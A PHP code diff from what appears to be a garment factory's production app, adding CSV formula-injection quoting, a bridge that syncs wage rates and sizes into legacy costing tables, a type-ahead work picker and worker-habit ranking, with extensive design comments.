+     * safety — it is about the round trip. The import strips ONE leading
+     * apostrophe back off. If the export did not add one to a name that already
+     * began with an apostrophe, that name would come back a character shorter
+     * every time it made the trip: 'Special -> Special.
+     *
+     * Quoting it here makes the pair exactly reversible for every input, which
+     * is the only version of this that is safe to run over your data
+     * repeatedly. (Found by the test below asserting the round trip, not by
+     * reading the code.) */
+    if (strpbrk($s[0], "=+-@\t\r'") !== false) return "'" . $s;
+    return $s;
+}
+
+/* Every cell of one row, made safe in one call. */
+function zp_csv_row(array $row): array { return array_map('zp_csv_cell', $row); }
+
+/* The other half of the round trip. */
+function zp_csv_unquote($v): string {
+    $s = (string)$v;
+    return ($s !== '' && $s[0] === "'") ? substr($s, 1) : $s;
+}
+
+/* ============================================================
+   THE BRIDGE — KEEPING COSTING FED
+   ============================================================
+
+   WHAT WENT WRONG, PLAINLY.
+
+   The rebuild moved sizes to zp_sizes and wage rates to zp_part_ops. Costing
+   was never moved with it: product_costing.php still reads product_sizes for
+   the size list and production_operations for the Workmanship rate. So a size
+   added in Product Master never reached Costing, and Workmanship computed to
+   zero — every costing sheet saved since the rebuild is missing its stitching
+   and cutting wages, and any suggested price built on one is too low.
+
+   WHY THE FIX GOES THIS WAY AND NOT THE OTHER.
+
+   product_sizes is read by fifteen files — proforma, search, both print
+   screens, Final Costing, the AI costing and AI check. Repointing Costing at
+   zp_sizes would fix one screen and leave fourteen split. So the NEW module
+   feeds the OLD tables instead, one way, on save. Costing is not edited at
+   all: it keeps reading exactly what it has always read, and starts seeing
+   real sizes and real rates.
+
+   THE THREE RULES THIS OBEYS.
+
+   1. NOTHING ON THE OLD SIDE IS EVER DELETED. A size in product_sizes that no
+      longer exists in zp_sizes is left alone: a saved costing version points
+      at that size id through costing_version_sizes, and removing it would
+      orphan a costing somebody already approved. Only rows this bridge itself
+      wrote (marked with zp_op_id) are ever removed.
+
+   2. A LEGACY OPERATION IS DEACTIVATED, NOT DESTROYED. production_operations
+      is SUMmed per component+operation. If a hand-entered legacy row survived
+      next to a mirrored one, the product would cost DOUBLE its true
+      workmanship — silently, and in the direction that loses a deal. So legacy
+      rows on a product this bridge now owns are set is_active=0. The row, its
+      rate and its history stay on disk and can be switched back on.
+
+   3. THE OLD STAGE COLUMN IS AN ENUM. production_operations.stage accepts only
+      Cutting, Stitching or Dispatch. 'Manual Cutting' is not in it and MySQL
+      would reject the row outright in strict mode, or store an empty string in
+      loose mode — losing the operation and its rate with no error anybody sees.
+      Manual Cutting is therefore written as Cutting. Nothing is lost by it:
+      Costing sums rates and never reads the stage, and the real stage stays
+      exact in zp_part_ops where the wage ledger reads it. */
+
+/* Manual Cutting is a real stage to the floor, but the old ENUM has no word
+   for it. Costing does not read stage, so mapping it is safe — silently
+   writing an invalid value would not be. */
+function zp_bridge_stage(string $stage): string {
+    /* The two words here are the OLD costing table's own ENUM values, not stage
+       names of yours — production_operations.stage accepts only Cutting,
+       Stitching or Dispatch and rejects or blanks anything else. Your stage is
+       mapped onto them BY POSITION: the stage that makes the pieces goes to
+       'Cutting', every later stage to 'Stitching'. Nothing is lost by it —
+       Costing sums rates and never reads the stage, and your real stage stays
+       exact in zp_part_ops.stage_id where every rule is decided. */
+    return zp_is_cutting($stage) ? 'Cutting' : 'Stitching';
+}
+
+/* Marks the rows this bridge owns, so a rate the team typed into the old
+   screen years ago is never mistaken for one of ours and deleted. */
+function zp_bridge_schema(): void {
+    static $done = false;
+    if ($done) return;
+    $done = true;
+    try { db()->exec("ALTER TABLE production_operations ADD COLUMN zp_op_id INT NULL DEFAULT NULL"); } catch (Throwable $e) {}
+    try { db()->exec("CREATE INDEX idx_zp_op ON production_operations (zp_op_id)"); } catch (Throwable $e) {}
+}
+
+/* THE SIZE MIRROR IS GONE, AND THAT IS THE POINT.
+ *
+ * zp_bridge_sizes() used to copy every size from zp_sizes into product_sizes on
+ * each save. There is now ONE size table, so there is nothing to copy: a size
+ * typed in Product Master IS the size Costing and Proforma read, the same row,
+ * the same id, the same instant.
+ *
+ * This function is kept only as the shape the rest of the bridge expects —
+ * a map of size id to size id, which for one table is every size mapped to
+ * itself. It writes nothing at all. */
+function zp_bridge_sizes(int $productId): array {
+    $map = [];
+    foreach (zp_sizes($productId) as $s) $map[(int)$s['id']] = (int)$s['id'];
+    return $map;
+}
+
+/* OPERATIONS: zp_part_ops -> production_operations.
+ *
+ * One "All Sizes" row per part+operation (product_size_id NULL), carrying the
+ * standard rate — because the quantity-per-set is what usually varies by size,
+ * and pc_workmanship_rate_for_version() multiplies those back together.
+ *
+ * PLUS, NOW, ONE EXTRA ROW PER SIZE RATE. product_size_id has existed on this
+ * table all along and costing genuinely reads it — but this function used to
+ * write NULL on every INSERT *and* every UPDATE, so a size rate set by hand
+ * here was wiped the next time a product's operations were saved. The column
+ * looked usable and was not. It is written properly now, from zp_op_rate.
+ *
+ * Costing therefore needs no change at all: pc_workmanship_rate_for_version()
+ * already prefers a size-scoped row over the All Sizes one. */
+function zp_bridge_ops(int $productId): array {
+    zp_bridge_schema();
+    $wrote = 0; $deactivated = 0;
+    try {
+        /* what the new module says this product's workmanship is */
+        $want = [];
+        foreach (zp_product_parts($productId) as $p) {
+            foreach (zp_part_ops((int)$p['id'], true) as $o) {
+                $want[(int)$o['id']] = [
+                    'component' => (string)$p['part_name'],
+                    'operation' => (string)$o['operation_name'],
+                    'stage'     => zp_bridge_stage((string)$o['stage']),
+                    'rate'      => (float)$o['rate'],
+                ];
+            }
+        }
+
+        /* RULE 2: a legacy row next to a mirrored one would DOUBLE the cost.
+           Switched off, never deleted — the rate and its history stay on disk. */
+        if ($want) {
+            $off = db()->prepare("UPDATE production_operations SET is_active=0
+                                  WHERE product_id=? AND zp_op_id IS NULL AND is_active=1");
+            $off->execute([$productId]);
+            $deactivated = $off->rowCount();
+        }
+
+        /* EVERY SIZE RATE BECOMES ITS OWN ROW, BESIDE THE "ALL SIZES" ONE.
+           product_size_id NULL is the fallback costing uses when the version is
+           not tied to exactly one size; a size row wins when it is. */
+        $sizeRates = zp_op_rate_map($productId);
+        $want2 = [];
+        foreach ($want as $zid => $w) {
+            $want2[$zid . '|0'] = $w + ['size' => null];        // the All Sizes row
+            foreach (($sizeRates[$zid] ?? []) as $sid => $rate)
+                $want2[$zid . '|' . (int)$sid] = ['component' => $w['component'],
+                                                  'operation' => $w['operation'],
+                                                  'stage'     => $w['stage'],
+                                                  'rate'      => (float)$rate,
+                                                  'size'      => (int)$sid];
+        }
+
+        /* our own previous mirror for this product.
+           KEYED ON zp_op_id *AND* SIZE. Keyed on the op alone — as it was when
+           every row was All Sizes — several rows for one operation would
+           collapse onto one key, and the bridge would rewrite the same row over
+           and over while leaving the rest to be deleted as strays. */
+        $cur = db()->prepare("SELECT id, zp_op_id, product_size_id FROM production_operations
+                              WHERE product_id=? AND zp_op_id IS NOT NULL");
+        $cur->execute([$productId]);
+        $have = [];
+        foreach ($cur->fetchAll() as $r)
+            $have[(int)$r['zp_op_id'] . '|' . (int)($r['product_size_id'] ?? 0)] = (int)$r['id'];
+
+        $ins = db()->prepare("INSERT INTO production_operations
+                              (product_id, operation_name, component_name, stage, product_size_id, rate, is_active, zp_op_id)
+                              VALUES (?,?,?,?,?,?,1,?)");
+        $upd = db()->prepare("UPDATE production_operations
+                              SET operation_name=?, component_name=?, stage=?, product_size_id=?, rate=?, is_active=1
+                              WHERE id=?");
+        foreach ($want2 as $key => $w) {
+            $zid = (int)explode('|', $key)[0];
+            if (isset($have[$key]))
+                $upd->execute([$w['operation'], $w['component'], $w['stage'], $w['size'], $w['rate'], $have[$key]]);
+            else
+                $ins->execute([$productId, $w['operation'], $w['component'], $w['stage'], $w['size'], $w['rate'], $zid]);
+            $wrote++;
+        }
+
+        /* an operation deleted or deactivated in the new module, OR a size rate
+           that has been cleared: this row IS ours, so removing it is safe and is
+           the only delete in the bridge. Deleted by ROW ID, not by zp_op_id —
+           the latter would take the All Sizes row with the size rows. */
+        $gone = array_diff_key($have, $want2);
+        if ($gone) {
+            $in = implode(',', array_fill(0, count($gone), '?'));
+            /* zp_op_id IS NOT NULL is belt AND braces. Every id in $have came
+               from a SELECT that already required it, so this adds nothing
+               today — but it keeps "only rows the bridge itself wrote" true
+               inside the DELETE rather than two statements away, where a later
+               change to the SELECT could quietly widen it. A legacy row that
+               somebody typed by hand is not ours to remove. */
+            $del = db()->prepare("DELETE FROM production_operations
+                                  WHERE product_id=? AND zp_op_id IS NOT NULL AND id IN ($in)");
+            $del->execute(array_merge([$productId], array_map('intval', array_values($gone))));
+        }
+    } catch (Throwable $e) { return ['ops' => $wrote, 'legacy_off' => $deactivated, 'error' => $e->getMessage()]; }
+    return ['ops' => $wrote, 'legacy_off' => $deactivated, 'error' => ''];
+}
+
+/* QUANTITY PER SET: zp_part_qty -> product_component_qty, in the old table's
+   size ids. A part with no row means one per set, never zero — the same rule
+   zp_qty_for() uses, so Costing and the floor cannot disagree about it. */
+function zp_bridge_qty(int $productId, array $sizeMap): int {
+    if (!$sizeMap) return 0;
+    $n = 0;
+    try {
+        $qty = zp_qty_map($productId);
+        $parts = zp_product_parts($productId);
+        $up = db()->prepare("INSERT INTO product_component_qty (product_id, product_size_id, component_name, qty_per_set)
+                             VALUES (?,?,?,?) ON DUPLICATE KEY UPDATE qty_per_set=VALUES(qty_per_set)");
+        foreach ($parts as $p) {
+            foreach ($sizeMap as $zpSizeId => $oldSizeId) {
+                $up->execute([$productId, $oldSizeId, (string)$p['part_name'],
+                              zp_qty_for($qty, (int)$p['id'], (int)$zpSizeId)]);
+                $n++;
+            }
+        }
+    } catch (Throwable $e) { return $n; }
+    return $n;
+}
+
+/* Mirror ONE product into the old tables. Called after a Product Master save. */
+function zp_bridge_sync_product(int $productId): array {
+    if ($productId <= 0) return ['ok' => false, 'error' => 'No product.'];
+    zp_ensure_schema();
+    $sizeMap = zp_bridge_sizes($productId);
+    $ops     = zp_bridge_ops($productId);
+    $qty     = zp_bridge_qty($productId, $sizeMap);
+    return ['ok' => $ops['error'] === '', 'error' => $ops['error'],
+            'sizes' => count($sizeMap), 'ops' => $ops['ops'],
+            'legacy_off' => $ops['legacy_off'], 'qty' => $qty];
+}
+
+/* A RATE LIVES ON THE PART, AND A PART IS SHARED.
+   Changing the Overlock rate in the Part Library changes the workmanship of
+   every product that uses that part, so every one of them has to be re-fed —
+   otherwise the Part Library and Costing quietly disagree about the wage. */
+function zp_bridge_sync_part(int $partId): array {
+    if ($partId <= 0) return ['products' => 0];
+    zp_ensure_schema();
+    $ids = [];
+    try {
+        $st = db()->prepare("SELECT DISTINCT product_id FROM zp_product_parts WHERE part_id=?");
+        $st->execute([$partId]);
+        $ids = array_map('intval', array_column($st->fetchAll(), 'product_id'));
+    } catch (Throwable $e) { return ['products' => 0]; }
+    foreach ($ids as $pid) zp_bridge_sync_product($pid);
+    return ['products' => count($ids)];
+}
+
+/* EVERY PRODUCT, ONCE — the catch-up for what the rebuild already broke.
+   Products saved before the bridge existed have no mirror, so their costing
+   still reads zero. This walks them all. */
+function zp_bridge_sync_all(): array {
+    zp_ensure_schema();
+    $n = 0; $ops = 0;
+    try {
+        $ids = array_map('intval', array_column(
+            db()->query("SELECT DISTINCT product_id FROM zp_product_parts")->fetchAll(), 'product_id'));
+    } catch (Throwable $e) { return ['products' => 0, 'ops' => 0]; }
+    foreach ($ids as $pid) { $r = zp_bridge_sync_product($pid); $n++; $ops += (int)$r['ops']; }
+    return ['products' => $n, 'ops' => $ops];
+}
+
+/* ============================================================
+   THE WORK INDEX — ONE FLAT LIST, SEARCHED AS YOU TYPE
+   ============================================================
+
+   The entry screen used to be three dropdowns: order, then operation, then
+   worker. Three decisions and three clicks for every line. At 200-300 lines a
+   day that is the whole job, and it is slow in the way that makes people batch
+   the work up and enter it days late.
+
+   So the picker becomes ONE list, and a row in it is a whole piece of work:
+
+       PI-1042 · Ideal Home · 7 pcs Bed in Bag · Double
+       Pillow Case -> Overlock · 5.00/pc · 420 left
+
+   Type any part of any of it and the list shortens. Press Enter and every one
+   of those fields is filled in — the size included, which is why the size had
+   to be linked properly first. Nothing is left to type but the quantity.
+
+   THE SEARCH TEXT IS BUILT HERE, ON THE SERVER, so the browser never has to
+   guess what a row means. 'hay' is everything about the row folded into one
+   lower-cased string; the browser just checks that every typed word appears
+   in it somewhere.
+
+   WHAT IS LEFT is on every row, and it comes from the same zp_remaining() the
+   save uses — so the list can never offer more than the server will accept. */
+function zp_work_index(): array {
+    zp_ensure_schema();
+    $prog = zp_progress_map();
+    $out  = [];
+    foreach (zp_open_lines() as $l) {
+        if (zp_size_problem($l) !== '') continue;     // cannot be planned, so cannot be offered
+        $pid   = (int)$l['product_id'];
+        $rates = zp_order_rate_map((int)$l['proforma_id']);
+        /* THE LIST MUST QUOTE WHAT THE SAVE WILL PAY. If this read the standard
+           rate while zp_book() froze a size rate, the floor would be shown one
+           number and paid another — and the difference would only ever surface
+           in a wage dispute. */
+        $szRates = zp_op_rate_map($pid);
+        $szId    = zp_line_size_id($l);
+        foreach (zp_product_parts($pid) as $p) {
+            $partId = (int)$p['id'];
+            foreach (zp_part_ops($partId, true) as $o) {
+                $opId  = (int)$o['id'];
+                $left = zp_remaining($l, $partId, $opId, (string)$o['stage'], $prog);
+                /* FINISHED WORK IS CARRIED, MARKED — NOT DROPPED.
+                   Dropping it would make a search for it come back "nothing
+                   matches", which reads as "that job does not exist" when the
+                   truth is "that job is done". Those two need different answers:
+                   one is a typo to correct, the other is good news. The list
+                   only OFFERS open work, but it can now say which it is. */
+                $done = $left <= 0.0001;
+                $rate  = zp_rate_for($opId, (float)$o['rate'], $rates, $szRates, $szId);
+                $stage = zp_stage_name((int)($o['stage_id'] ?: zp_stage_id_for((string)$o['stage'])));
+                $out[] = [
+                    'k'    => (int)$l['item_id'] . ':' . $opId,
+                    'item' => (int)$l['item_id'],
+                    'op'   => $opId,
+                    'part' => $partId,
+                    'pi'   => (string)$l['pi_no'],
+                    'cust' => (string)($l['customer_name'] ?? ''),
+                    'prod' => (string)$l['product_name'],
+                    'size' => (string)($l['size'] ?? ''),
+                    'pn'   => (string)$p['part_name'],
+                    'on'   => (string)$o['operation_name'],
+                    'st'   => $stage,
+                    'rate' => round($rate, 2),
+                    'left' => round($left, 2),
+                    'done' => $done ? 1 : 0,
+                    'hay'  => mb_strtolower(trim(implode(' ', [
+                                  $l['pi_no'], $l['customer_name'] ?? '', $l['product_name'],
+                                  $l['size'] ?? '', $p['part_name'], $o['operation_name'], $stage,
+                              ]))),
+                ];
+            }
+        }
+    }
+    return $out;
+}
+
+/* ============================================================
+   LEARNED DEFAULTS — WHAT THIS WORKER USUALLY DOES
+   ============================================================
+
+   Asked for in your words: "if worker Ali only using for cutting, so trend keep
+   remember and mostly likely their related usual trend, but it's not fix".
+
+   The name for that is a LEARNED DEFAULT. Nothing is fixed to anybody: every
+   worker can still be booked on every operation, and every operation can still
+   be given to anybody. What changes is only the ORDER of the list — the ones
+   that person actually does float to the top, so the common case is the first
+   thing under the cursor and the rare case is still one keystroke away.
+
+   IT IS LEARNED FROM WHAT WAS REALLY BOOKED, not from a setting somebody has
+   to maintain. A setting would be wrong within a month and nobody would notice.
+
+   RECENT WORK COUNTS FOR MORE. A worker moved from Cutting to Stitching three
+   weeks ago should rank as a stitcher now, so the last 30 days are weighted
+   three times the 90-day history behind them.
+
+   CANCELLED ENTRIES ARE EXCLUDED. A mistake that was corrected must not teach
+   the screen to suggest the same mistake again. */
+function zp_worker_habit(int $days = 90): array {
+    zp_ensure_schema();
+    $out = ['byWorker' => [], 'byOp' => []];
+    try {
+        $from   = date('Y-m-d', strtotime("-$days days"));
+        $recent = date('Y-m-d', strtotime('-30 days'));
+        $st = db()->prepare(
+            "SELECT worker_id, op_id,
+                    COUNT(*) n,
+                    SUM(CASE WHEN entry_date >= ? THEN 1 ELSE 0 END) recent
+             FROM zp_entries
+             WHERE status='active' AND entry_date >= ?
+             GROUP BY worker_id, op_id");
+        $st->execute([$recent, $from]);
+        foreach ($st->fetchAll() as $r) {
+            $w = (int)$r['worker_id']; $o = (int)$r['op_id'];
+            /* recent work counts triple: the extra weight is 2x the recent
+               count on top of the 1x every entry already carries */
+            $score = (int)$r['n'] + 2 * (int)$r['recent'];
+            $out['byWorker'][$w][$o] = $score;
+            $out['byOp'][$o][$w]     = $score;
+        }
+    } catch (Throwable $e) {}
+    return $out;
+}
